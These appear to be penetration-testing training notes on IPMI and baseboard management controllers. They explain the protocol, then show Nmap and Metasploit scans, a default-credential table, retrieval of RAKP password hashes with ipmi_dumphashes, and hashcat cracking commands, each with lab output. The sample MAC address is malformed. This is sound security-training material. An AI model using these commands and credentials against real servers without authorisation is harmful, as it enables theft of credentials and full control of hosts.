**What IPMI is**

- **IPMI (Intelligent Platform Management Interface)** = a standardized set of specs for **hardware-based host management** (managing/monitoring systems).
- Runs as an **autonomous subsystem**, independent of the host's BIOS, CPU, firmware, and operating system.
- Lets sysadmins manage/monitor a system **even when it's powered off or unresponsive**.
- Works over a **direct network connection to the hardware** — no OS login/shell needed.
- Can do **remote upgrades** without physical access to the host.

**Typical uses (3 main ones)**

- Before the OS boots → modify **BIOS settings**.
- When the host is **fully powered down**.
- Accessing a host **after a system failure**.

**What it monitors when not doing the above**

- System temperature, voltage, fan status, power supplies.
- Querying inventory info, reviewing hardware logs.
- Alerting via **SNMP**.

**Power/connection requirement**

- The host can be off, but the **IPMI module itself needs a power source and a LAN connection** to work.

**Background**

- First published by **Intel in 1998**; now supported by **200+ vendors** (Cisco, Dell, HP, Supermicro, Intel, etc.).
- **IPMI version 2.0** supports administration via **serial over LAN** (view serial console output in-band).

**Required components**

- **BMC (Baseboard Management Controller)** — the micro-controller; the essential core of IPMI.
- **ICMB (Intelligent Chassis Management Bus)** — interface for communication **between chassis**.
- **IPMB (Intelligent Platform Management Bus)** — **extends** the BMC.
- **IPMI Memory** — stores the system event log, repository store data, etc.
- **Communications Interfaces** — local system interfaces, serial & LAN interfaces, ICMB, and PCI Management Bus.

## Footprinting the Service 

IPMI communicates over port **623 UDP**. Systems that use the IPMI protocol are called **Baseboard Management Controllers (BMCs)**. BMCs are typically implemented as embedded ARM systems running Linux, and connected directly to the host's motherboard. BMCs are built into many motherboards but can also be added to a system as a PCI card. Most servers either come with a BMC or support adding a BMC. The most common BMCs we often see during internal penetration tests are HP iLO, Dell DRAC, and Supermicro IPMI. If we can access a BMC during an assessment, we would gain full access to the host motherboard and be able to monitor, reboot, power off, or even reinstall the host operating system. Gaining access to a BMC is nearly equivalent to physical access to a system. Many BMCs (including HP iLO, Dell DRAC, and Supermicro IPMI) expose a web-based management console, some sort of command-line remote access protocol such as Telnet or SSH, and the port 623 UDP, which, again, is for the IPMI network protocol. Below is a sample Nmap scan using the Nmap [ipmi-version](https://nmap.org/nsedoc/scripts/ipmi-version.html) NSE script to footprint the service.

### Nmap 

```shell
aymane0x90@htb[/htb]$ sudo nmap -sU --script ipmi-version -p 623 ilo.inlanfreight.local

Starting Nmap 7.92 ( https://nmap.org ) at 2021-11-04 21:48 GMT
Nmap scan report for ilo.inlanfreight.local (172.16.2.2)
Host is up (0.00064s latency).

PORT    STATE SERVICE
623/udp open  asf-rmcp
| ipmi-version:
|   Version:
|     IPMI-2.0
|   UserAuth:
|   PassAuth: auth_user, non_null_user
|_  Level: 2.0
MAC Address: 14:03:DC:674:18:6A (Hewlett Packard Enterprise)

Nmap done: 1 IP address (1 host up) scanned in 0.46 seconds
```

Here, we can see that the IPMI protocol is indeed listening on port 623, and Nmap has fingerprinted version 2.0 of the protocol. We can also use the Metasploit scanner module [IPMI Information Discovery](https://www.rapid7.com/db/modules/auxiliary/scanner/ipmi/ipmi_version/) (`auxiliary/scanner/ipmi/ipmi_version`).

### Metasploit Version Scan

```shell
msf6 > use auxiliary/scanner/ipmi/ipmi_version 
msf6 auxiliary(scanner/ipmi/ipmi_version) > set rhosts 10.129.42.195
msf6 auxiliary(scanner/ipmi/ipmi_version) > show options 

Module options (auxiliary/scanner/ipmi/ipmi_version):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   BATCHSIZE  256              yes       The number of hosts to probe in each set
   RHOSTS     10.129.42.195    yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT      623              yes       The target port (UDP)
   THREADS    10               yes       The number of concurrent threads


msf6 auxiliary(scanner/ipmi/ipmi_version) > run

[*] Sending IPMI requests to 10.129.42.195->10.129.42.195 (1 hosts)
[+] 10.129.42.195:623 - IPMI - IPMI-2.0 UserAuth(auth_msg, auth_user, non_null_user) PassAuth(password, md5, md2, null) Level(1.5, 2.0) 
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

During internal penetration tests, we often find BMCs where the administrators have not changed the default password. Some unique default passwords to keep in our cheatsheets include:

|Product|Username|Password|
|---|---|---|
|Dell iDRAC|root|calvin|
|HP iLO|Administrator|randomized 8-character string consisting of numbers and uppercase letters|
|Supermicro IPMI|ADMIN|ADMIN|

It is also essential to try out known default passwords for ANY services that we discover, as these are often left unchanged and can lead to quick wins. When dealing with BMCs, these default passwords may gain us access to the web console or even command line access via SSH or Telnet.

## Dangerous Settings

If default credentials do not work to access a BMC, we can turn to a [flaw](https://web.archive.org/web/20260421071724/http://fish2.com/ipmi/remote-pw-cracking.html) in the RAKP protocol in IPMI 2.0. During the authentication process, the server sends a salted SHA1 or MD5 hash of the user's password to the client before authentication takes place. This can be leveraged to obtain the password hash for ANY valid user account on the BMC. These password hashes can then be cracked offline using a dictionary attack using `Hashcat` mode `7300`. In the event of an HP iLO using a factory default password, we can use this Hashcat mask attack command `hashcat -m 7300 ipmi.txt -a 3 ?1?1?1?1?1?1?1?1 -1 ?d?u` which tries all combinations of upper case letters and numbers for an eight-character password.

```shell
┌─[aymane@parrot]─[~]
└──╼ $hashcat -m 7300 b20a936282050000992f4911d3567c4123e46c4bf5d2cc9e2fcbbb81974a4d9369e373925e41a065a123456789abcdefa123456789abcdef140561646d696e:e5d4c37005757f9ee9722a07f5c508d8f34b8848 /usr/share/wordlists/rockyou.txt

[...]

b20a936282050000992f4911d3567c4123e46c4bf5d2cc9e2fcbbb81974a4d9369e373925e41a065a123456789abcdefa123456789abcdef140561646d696e:e5d4c37005757f9ee9722a07f5c508d8f34b8848:trinity
```

There is no direct "fix" to this issue because the flaw is a critical component of the IPMI specification. Clients can opt for very long, difficult to crack passwords or implement network segmentation rules to restrict the direct access to the BMCs. It is important to not overlook IPMI during internal penetration tests (we see it during most assessments) because not only can we often gain access to the BMC web console, which is a high-risk finding, but we have seen environments where a unique (but crackable) password is set that is later re-used across other systems. On one such penetration test, we obtained an IPMI hash, cracked it offline using Hashcat, and were able to SSH into many critical servers in the environment as the root user and gain access to web management consoles for various network monitoring tools.

To retrieve IPMI hashes, we can use the Metasploit [IPMI 2.0 RAKP Remote SHA1 Password Hash Retrieval](https://www.rapid7.com/db/modules/auxiliary/scanner/ipmi/ipmi_dumphashes/) module.

### Metasploit Dumping Hashes

```shell
msf6 > use auxiliary/scanner/ipmi/ipmi_dumphashes 
msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > set rhosts 10.129.42.195
msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > show options 

Module options (auxiliary/scanner/ipmi/ipmi_dumphashes):

   Name                 Current Setting                                                    Required  Description
   ----                 ---------------                                                    --------  -----------
   CRACK_COMMON         true                                                               yes       Automatically crack common passwords as they are obtained
   OUTPUT_HASHCAT_FILE                                                                     no        Save captured password hashes in hashcat format
   OUTPUT_JOHN_FILE                                                                        no        Save captured password hashes in john the ripper format
   PASS_FILE            /usr/share/metasploit-framework/data/wordlists/ipmi_passwords.txt  yes       File containing common passwords for offline cracking, one per line
   RHOSTS               10.129.42.195                                                      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT                623                                                                yes       The target port
   THREADS              1                                                                  yes       The number of concurrent threads (max one per host)
   USER_FILE            /usr/share/metasploit-framework/data/wordlists/ipmi_users.txt      yes       File containing usernames, one per line



msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > run

[+] 10.129.42.195:623 - IPMI - Hash found: ADMIN:8e160d4802040000205ee9253b6b8dac3052c837e23faa631260719fce740d45c3139a7dd4317b9ea123456789abcdefa123456789abcdef140541444d494e:a3e82878a09daa8ae3e6c22f9080f8337fe0ed7e
[+] 10.129.42.195:623 - IPMI - Hash for user 'ADMIN' matches password 'ADMIN'
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

> Experimenting with different word lists is crucial for obtaining the password from the acquired hash.

Here we can see that we have successfully obtained the password hash for the user `ADMIN`, and the tool was able to quickly crack it to reveal what appears to be a default password `ADMIN`. From here, we could attempt to log in to the BMC, or, if the password were something more unique, check for password re-use on other systems. IPMI is very common in network environments since sysadmins need to be able to access servers remotely in the event of an outage or perform certain maintenance tasks that they would traditionally have had to be physically in front of the server to complete. This ease of administration comes with the risk of exposing password hashes to anyone on the network and can lead to unauthorized access, system disruption, and even remote code execution. Checking for IPMI should be part of our internal penetration test playbook for any environment we find ourselves assessing.
